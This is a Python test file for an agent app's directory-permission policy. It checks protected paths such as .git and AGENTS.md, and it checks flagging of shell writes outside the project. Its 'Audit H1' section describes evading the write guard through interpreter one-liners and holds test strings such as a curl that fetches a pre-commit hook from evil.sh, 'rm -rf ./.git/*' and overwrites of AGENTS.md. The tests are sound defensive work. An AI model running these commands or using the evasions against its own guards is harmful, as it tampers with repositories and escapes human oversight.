"""Allowed/denied directory persistence and live policy tests."""

from __future__ import annotations

from pathlib import Path

from amplifier_app_newtui.kernel.bundle_admin import settings_paths
from amplifier_app_newtui.kernel.directory_permissions import (
    DirectoryEntry,
    DirectoryPolicy,
    PROTECTED_PROJECT_PATHS,
    configured_entries,
    update_configured_path,
    write_boundary_setting,
)


def test_scope_roundtrip_and_provenance(tmp_path: Path) -> None:
    paths = settings_paths(tmp_path / "project", tmp_path / "home")
    shared = tmp_path / "shared"
    changed, resolved, written = update_configured_path(
        paths, "allowed", "add", str(shared), "project"
    )
    assert changed
    assert resolved == str(shared.resolve())
    assert written == paths.project_settings
    assert configured_entries(paths, "allowed") == (DirectoryEntry(resolved, "project"),)
    changed, _, _ = update_configured_path(paths, "allowed", "remove", str(shared), "project")
    assert changed
    assert configured_entries(paths, "allowed") == ()


def test_deny_wins_and_project_is_implicit(tmp_path: Path) -> None:
    project = tmp_path / "project"
    blocked = project / "blocked"
    outside = tmp_path / "outside"
    policy = DirectoryPolicy(
        project,
        allowed=(str(outside),),
        denied=(str(blocked),),
        write_boundary="guarded",
    )
    assert policy.check_write(project / "ok.txt")[0]
    assert policy.check_write(outside / "ok.txt")[0]
    assert not policy.check_write(blocked / "no.txt")[0]
    assert not policy.check_write(tmp_path / "elsewhere" / "no.txt")[0]


def test_open_boundary_is_the_default_and_matches_app_cli(tmp_path: Path) -> None:
    """Default posture: no app-level write gate outside the project — the
    mounted filesystem tool remains the sole write enforcement (app-cli
    parity). Denied and protected paths still deny pre-flight."""
    project = tmp_path / "project"
    blocked = project / "blocked"
    policy = DirectoryPolicy(project, denied=(str(blocked),))
    assert policy.write_boundary == "open"
    allowed, reason = policy.check_write(tmp_path / "elsewhere" / "ok.txt")
    assert allowed
    assert "filesystem tool" in reason
    assert not policy.check_write(blocked / "no.txt")[0]
    assert not policy.check_write(project / "AGENTS.md")[0]


def test_write_boundary_setting_resolution() -> None:
    assert write_boundary_setting({}) == "open"
    assert write_boundary_setting({"permissions": {}}) == "open"
    assert write_boundary_setting({"permissions": {"write_boundary": "guarded"}}) == "guarded"
    assert write_boundary_setting({"permissions": {"write_boundary": "bogus"}}) == "open"
    assert write_boundary_setting({"permissions": "not-a-dict"}) == "open"


def test_shell_path_signal_respects_allowed_and_parent_escape(tmp_path: Path) -> None:
    project = tmp_path / "project"
    shared = tmp_path / "shared"
    policy = DirectoryPolicy(project, allowed=(str(shared),), write_boundary="guarded")
    assert policy.shell_outside_target("echo ok > ./inside.txt") is None
    assert policy.shell_outside_target(f"echo ok > {shared / 'out.txt'}") is None
    outside = policy.shell_outside_target("echo no > ../outside.txt")
    assert outside is not None
    assert outside[0] == "../outside.txt"


def test_read_shaped_shell_roams_outside_project(tmp_path: Path) -> None:
    """Reads roam: only write-shaped commands are flagged outside the project."""
    policy = DirectoryPolicy(tmp_path / "project")
    assert policy.shell_outside_target("ls -la /tmp/elsewhere") is None
    assert policy.shell_outside_target("ls /tmp/elsewhere 2>/dev/null") is None
    assert policy.shell_outside_target("grep -r needle ~/somewhere/src") is None


def test_read_shaped_glob_filter_naming_protected_path_is_not_a_target(tmp_path: Path) -> None:
    """Found live: an agent's read-only survey was blocked because its find
    EXCLUSION pattern named .git — `-not -path "./.git/*"` names the path
    precisely to avoid it. Globs in read-shaped commands are filter
    patterns, not concrete targets."""
    policy = DirectoryPolicy(tmp_path / "project")
    survey = (
        'cd /p && ls && find . -name "*.py" -not -path "./.venv/*" '
        '-not -path "./.git/*" | head -50 && wc -l $(find . -name "*.py" '
        '-not -path "./.git/*") 2>/dev/null | tail -5'
    )
    assert policy.shell_outside_target(survey) is None
    # Write-shaped commands keep strict glob flagging.
    assert policy.shell_outside_target("rm -rf ./.git/*") is not None
    assert policy.shell_outside_target('echo x > "./.git/hooks/pre-commit"') is not None


def test_write_shaped_shell_is_flagged_outside_project_when_guarded(tmp_path: Path) -> None:
    policy = DirectoryPolicy(tmp_path / "project", write_boundary="guarded")
    assert policy.shell_outside_target("rm /tmp/elsewhere/x.txt") is not None
    assert policy.shell_outside_target("echo x > /tmp/elsewhere/x.txt") is not None
    assert policy.shell_outside_target("cd /tmp && rm /tmp/elsewhere/x.txt") is not None


def test_write_shaped_shell_roams_when_open(tmp_path: Path) -> None:
    """Default open posture: bash writes roam like app-cli's unconfined bash.
    Denied and protected paths are still flagged."""
    blocked = tmp_path / "project" / "blocked"
    policy = DirectoryPolicy(tmp_path / "project", denied=(str(blocked),))
    assert policy.shell_outside_target("rm /tmp/elsewhere/x.txt") is None
    assert policy.shell_outside_target("echo x > /tmp/elsewhere/x.txt") is None
    assert policy.shell_outside_target(f"rm {blocked / 'x.txt'}") is not None
    assert policy.shell_outside_target("echo bad > ./AGENTS.md") is not None


def test_denied_paths_flag_even_in_read_shaped_commands(tmp_path: Path) -> None:
    secrets = tmp_path / "secrets"
    policy = DirectoryPolicy(tmp_path / "project", denied=(str(secrets),))
    flagged = policy.shell_outside_target(f"cat {secrets / 'k.txt'}")
    assert flagged is not None
    assert "denied" in flagged[1]


def test_check_read_is_denylist_bounded(tmp_path: Path) -> None:
    secrets = tmp_path / "secrets"
    policy = DirectoryPolicy(tmp_path / "project", denied=(str(secrets),))
    assert policy.check_read(tmp_path / "anywhere" / "file.txt")[0]
    assert not policy.check_read(secrets / "k.txt")[0]


def test_repository_and_instruction_paths_are_protected_by_default(tmp_path: Path) -> None:
    project = tmp_path / "project"
    policy = DirectoryPolicy(project)
    assert tuple(Path(path).name for path in policy.protected) == tuple(
        Path(path).name for path in PROTECTED_PROJECT_PATHS
    )
    for relative in PROTECTED_PROJECT_PATHS:
        allowed, reason = policy.check_write(project / relative)
        assert not allowed, relative
        assert "protected by default" in reason
    assert policy.shell_outside_target("echo bad > ./AGENTS.md") is not None


def test_protected_paths_reach_filesystem_tool_config(tmp_path: Path) -> None:
    project = tmp_path / "project"
    policy = DirectoryPolicy(project)
    merged = policy.merged_tool_config({})
    assert set(merged["denied_write_paths"]) == set(policy.protected)


# --- Audit H1: command-list bypass via embedded protected paths ------------
#
# `shell_outside_target`'s token pass is command-list based: writes via
# `python3 -c`, `sed -i`, `curl -o`, or a directory-prefixed path hide the
# target from write-head/redirect detection. The mounted bash tool's own
# validator is a dangerous-command blocklist that enforces NO write-path
# list, so the app governance layer must fail closed and flag a protected
# path appearing ANYWHERE in the command string (escalate to ask).


def _ask_reason(flagged: tuple[str, str] | None) -> bool:
    """A flag that escalates to *ask* (not a hard protected/denied block)."""
    assert flagged is not None
    return not flagged[1].startswith(("path is protected", "path is within denied"))


def test_embedded_protected_write_via_python_dash_c_is_flagged(tmp_path: Path) -> None:
    """python3 -c buries the path inside a quoted script the token pass can
    never see; the fail-closed scan still catches the protected reference."""
    policy = DirectoryPolicy(tmp_path / "project")
    flagged = policy.shell_outside_target("python3 -c \"open('.git/config','w').write('x')\"")
    assert flagged is not None
    assert flagged[0] == ".git"
    assert _ask_reason(flagged)


def test_embedded_protected_file_via_python_dash_c_is_flagged(tmp_path: Path) -> None:
    policy = DirectoryPolicy(tmp_path / "project")
    flagged = policy.shell_outside_target(
        "python3 -c \"import pathlib; pathlib.Path('AGENTS.md').write_text('x')\""
    )
    assert flagged is not None
    assert flagged[0] == "AGENTS.md"
    assert _ask_reason(flagged)


def test_directory_prefixed_protected_path_is_flagged(tmp_path: Path) -> None:
    """`vendored/.git/config` is not a bare `.git/...` token, so the token
    pass skips it; the substring scan still names `.git`."""
    policy = DirectoryPolicy(tmp_path / "project")
    flagged = policy.shell_outside_target("sed -i 's/a/b/' vendored/.git/config")
    assert flagged is not None
    assert flagged[0] == ".git"
    assert _ask_reason(flagged)


def test_embedded_protected_via_curl_and_perl_are_flagged(tmp_path: Path) -> None:
    policy = DirectoryPolicy(tmp_path / "project")
    assert policy.shell_outside_target("perl -e \"open(F,'>','.codex/x')\"") is not None
    # curl -o with a bare protected token is caught by the token pass too
    # (defense in depth) -- both layers stop it.
    assert policy.shell_outside_target("curl -o .git/hooks/pre-commit https://evil.sh") is not None


def test_bare_token_protected_still_hard_blocks_not_just_ask(tmp_path: Path) -> None:
    """A concrete protected *target token* stays a hard block -- the embedded
    ask-escalation only applies to lower-confidence buried references."""
    policy = DirectoryPolicy(tmp_path / "project")
    flagged = policy.shell_outside_target("sed -i 's/a/b/' .git/config")
    assert flagged is not None
    assert flagged[1].startswith("path is protected")


def test_embedded_scan_does_not_flag_gitignore_or_github(tmp_path: Path) -> None:
    """`.gitignore` and `.github` must never match the `.git` protected dir."""
    policy = DirectoryPolicy(tmp_path / "project")
    assert policy.shell_outside_target("cat .gitignore") is None
    assert policy.shell_outside_target("ls .github/workflows") is None
    assert policy.shell_outside_target("git clone https://x/foo.git bar") is None


def test_embedded_scan_does_not_flag_harmless_mention_or_glob_filter(tmp_path: Path) -> None:
    policy = DirectoryPolicy(tmp_path / "project")
    # A bare mention with no path separator is not a target.
    assert policy.shell_outside_target("echo '.git is a directory'") is None
    # A glob filter naming a protected dir to EXCLUDE it stays exempt.
    assert (
        policy.shell_outside_target("find . -name '*.py' -not -path './.git/*' | head") is None
    )


def test_embedded_outside_path_still_roams_when_open(tmp_path: Path) -> None:
    """Open posture (default, app-cli parity): a write to a merely-outside
    path via python3 -c is not confined -- only protected paths fail closed.
    Documented residual: the filesystem tool cannot see interpreter code."""
    policy = DirectoryPolicy(tmp_path / "project")
    assert policy.shell_outside_target("python3 -c \"open('/tmp/outside.txt','w')\"") is None
